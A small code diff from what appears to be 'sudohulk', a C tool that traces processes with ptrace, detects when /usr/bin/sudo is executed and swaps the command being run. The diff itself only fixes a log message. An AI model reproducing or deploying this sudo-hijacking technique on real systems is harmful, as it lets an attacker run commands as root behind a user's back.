@@ -186,7 +186,7 @@ int ptrace_loop(sudohulk_options_t *opts){
 					printf("[+] (%d) sys_execve detected >>> '%s'\n", return_pid, filename);
 
 					if(!strcmp(filename, "/usr/bin/sudo")){
-						printf("[+] sudo detect\n");
+						printf("[+] sudo detected\n");
 						if(cmd_change(return_pid, opts, &regs)){
 							skip = opts->quit;
 							ret++;
